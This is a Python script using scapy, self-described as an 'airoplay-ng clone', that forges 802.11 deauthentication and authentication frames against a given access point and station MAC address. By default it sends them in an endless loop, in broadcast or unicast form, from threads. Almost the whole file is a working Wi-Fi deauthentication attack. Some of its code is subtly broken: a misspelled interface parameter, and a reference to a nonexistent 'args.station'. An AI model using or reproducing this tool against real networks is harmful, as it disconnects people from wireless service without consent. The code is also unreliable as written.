from scapy.layers.dot11 import *
import argparse
from argparse import RawTextHelpFormatter
import threading

def AP_broadcast(ap, iface, cnt=0):
    # ap to broadcast
    target_mac = 'ff:ff:ff:ff:ff:Ff'
    base_pkt = Dot11(subtype=12,addr1=target_mac, addr2=ap, addr3=ap)
    pkt = RadioTap()/base_pkt/Dot11Deauth(reason=7)
    if cnt == 0:
        sendp(pkt, inter=0.1, iface=iface, verbose=False,loop=1)
    else:
        sendp(pkt, inter=0.1, count=cnt, iface=iface, verbose=False)

def AP_unicast(ap, station, iface, cnt=0):
    # ap to station
    base_pkt = Dot11(subtype=12,addr1=ap, addr2=station, addr3=station)
    pkt = RadioTap()/base_pkt/Dot11Deauth(reason=7)
    if cnt == 0:
        sendp(pkt, inter=0.1, iface=iface, verbose=False,loop=1)
    else:
        sendp(pkt, inter=0.1, count=cnt,iface=iface, verbose=False)

def Station_unicast(station, ap, iface, cnt=0):
    # station to ap
    base_pkt = Dot11(subtype=12,addr1=station, addr2=ap, addr3=ap)
    pkt = RadioTap()/base_pkt/Dot11Deauth(reason=7)
    if cnt == 0:
        sendp(pkt, inter=0.1, iface=iface, verbose=False, loop=1)
    else:
        sendp(pkt, inter=0.1, count=cnt,iface=iface, verbose=False)

def auth_Station_req(station, ap, ifcae, cnt=0):
    # station to ap
    base_pkt = Dot11(subtype=11,addr1=station, addr2=ap, addr3=station)
    pkt = RadioTap()/base_pkt/Dot11Auth(seqnum=0x0002)
    if cnt == 0:
        sendp(pkt, inter=0.1, iface=iface, verbose=False, loop=1)
    else:
        sendp(pkt, inter=0.1, count=cnt,iface=iface, verbose=False)

def auth_Station_res(ap, station,ifcae, cnt=0):
    # ap to station
    base_pkt = Dot11(subtype=11,addr1=ap, addr2=station, addr3=ap)
    pkt = RadioTap()/base_pkt/Dot11Auth(seqnum=0x0001)
    if cnt == 0:
        sendp(pkt, inter=0.1, iface=iface, verbose=False, loop=1)
    else:
        sendp(pkt, inter=0.1, count=cnt,iface=iface, verbose=False)


parser = argparse.ArgumentParser(description='airoplay-ng clone\n\nusage: python3 airoplay-ng.py <interface>',formatter_class=RawTextHelpFormatter)
parser.add_argument('-i', help='<interface>',required=True)
parser.add_argument('-a', help='<AP MAC Address>',required=True)
parser.add_argument('-s', help='<Station MAC Address>', required=False)
parser.add_argument('-auth', help='[-auth]', required=False, action='store_true')

args = parser.parse_args()
iface = args.i
ap_mac_addr = args.a
print(args.auth)
if not args.auth:
    if args.s is None:
        AP_broadcast(ap_mac_addr, iface)
    else:
        station_mac_addr = args.station
        ap_un = threading.Thread(target=AP_unicast, args=(ap_mac_addr, station_mac_addr, iface))
        station_un = threading.Thread(target=Station_unicast, args=(station_mac_addr, ap_mac_addr, iface))
        ap_un.start()
        station_un.start()
else:
    station_mac_addr = args.s
    auth_req = threading.Thread(target=auth_Station_req, args=(station_mac_addr, ap_mac_addr, iface))
    auth_res = threading.Thread(target=auth_Station_res, args=(ap_mac_addr, station_mac_addr, iface))
    auth_req.start()
    auth_res.start()